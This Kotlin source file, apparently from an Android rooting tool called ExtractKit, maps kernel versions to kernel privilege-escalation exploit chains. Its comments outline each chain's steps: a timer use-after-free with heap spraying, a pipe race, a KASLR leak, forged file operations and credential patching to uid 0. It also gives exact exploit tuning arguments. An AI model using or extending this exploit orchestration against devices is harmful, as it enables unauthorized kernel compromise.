package com.extractkit.app

/**
 * 内核分支 -> 利用链身份（与 payload 里的 EXTRACTKIT_CHAIN 一一对应）。
 *
 * 为什么单独一个文件：9.146 起六支 payload 不再是同一份源码编六次，
 * 而是四条不同的链（见 payload/src/chain_sel.h）：
 *
 *   5.10 / 5.15 -> HONOR  仿「荣耀5系提权」assets/libsysopt.so 的 POSIX timer UAF + AIO/io_uring 喷射链
 *   6.1         -> BRM    仿 ma.apk assets/61157/brm_plant 的 linear-map 标定 + timer 回收链
 *   6.6 / 6.12  -> LEGACY 我们 9.144 的老链，原样保留（一个字节都没动）
 *   6.18        -> K618   仿 ma.apk assets/EK-CORE-61821/exploit-android-key-ptr 的 stream/half/pick_triple 链
 *
 * 链身份同时决定三件事：跑哪份二进制（ReleaseMatrix 已决定）、命令行参数长什么样、
 * 需不需要额外推资产（HONOR 要 perfprobe / msm_perf.ko / perf.tbl）。
 */
enum class Chain(val id: Int, val chainName: String) {
    LEGACY(0, "legacy-EK-CORE"),
    HONOR(1, "honor-uaf"),
    BRM(2, "brm-plant"),
    K618(3, "keyptr-618"),

    /**
     * 9.282：一键root v1.6(glpreload) 那条链，原封不动照搬，只在 uid=0 之后
     * 把它的「dump 内嵌 kernelsu.ko 再 late-load」换成我们自己的 ksu_stage.sh。
     * race(三线程 pipe 竞态) -> perf KASLR -> 伪造 fops -> pipe 物理读写 ->
     * find_task_by_tgid -> patch cred(uid=0 + caps 满 + sid=kernel) -> 我们的 late-load。
     */
    GHOST(4, "ghost-EK-CORE"),
}

object ChainPlan {

    /** 内核分支 -> 链。矩阵外的 release 一律按 legacy（与 ReleaseMatrix 回落字面版一致）。 */
    fun of(family: String?): Chain = when (family) {
        "5.10", "5.15" -> Chain.HONOR
        "6.1" -> Chain.BRM
        "6.18" -> Chain.K618
        else -> Chain.LEGACY
    }

    /** 直接按 uname -r 判链。 */
    fun ofRelease(release: String?): Chain = of(ReleaseMatrix.familyOf(release))

    fun nameOf(release: String?): String = ofRelease(release).chainName

    /** HONOR 链要落在设备上的外部资产（名字 -> 是否需要执行位）。 */
    val HONOR_TARGET = "perfprobe"
    val HONOR_MAP = HonorMap.FILE

    /**
     * HONOR 链的命令行：与参考实现 assets/bootflow.sh 的 ARGS 逐字一致，
     * 只把 $D 换成我们自己的 work 目录。
     *
     * 原串（bootflow.sh）：
     *   chain=1 reap=1 reapmax=2 attempts=4 timers=0 delays=0,100,200,400 reserve=2000
     *   reserverounds=1 settle=0 storm=0 uring=0 spray=20 skb=0 stamp=4000 pinwave=0
     *   tail=0 tries=24 perf=300 poolhold=1500 target=$D/perfprobe target_exit=42
     *   load=$D/$KO loadparams= loadmap=$D/honor.map log=$LOG reservesettle=0 claimms=150
     *   rcuwait=50 sweep=16 trace=0 seearly=1 warmwant=0 sigearly=0
     */
    fun honorArgs(workDir: String): String {
        val d = workDir
        return "chain=1 reap=1 reapmax=2 attempts=4 timers=0 delays=0,100,200,400 " +
            "reserve=2000 reserverounds=1 settle=0 storm=0 uring=0 spray=20 skb=0 " +
            "stamp=4000 pinwave=0 tail=0 tries=24 perf=300 poolhold=1500 " +
            "target=$d/$HONOR_TARGET target_exit=42 " +
            "load= loadparams= loadmap=$d/$HONOR_MAP " +
            "log=$d/honor.log reservesettle=0 claimms=150 rcuwait=50 sweep=16 " +
            "trace=0 seearly=1 warmwant=0 sigearly=0"
    }

    /**
     * 实际下发给 payload 的参数。
     *
     * 9.269：六支统一成同一套实现（fake cred + ksu_stage late-load），只在启动时认
     * check/leak/selftest/fake/wait/shell 这些单词，不再有按族切换的 k=v 参数面，
     * 所以这里直接给 Mode.args。
     */
    fun argsFor(family: String?, baseArgs: String, workDir: String = ExtractEngine.WORK_DIR): String =
        baseArgs

    /** 6.1（brm_plant）要求开机沉降：参考 run61157.sh 的 MINUP=120s。 */
    const val BRM_MIN_UPTIME_SEC = 120
}
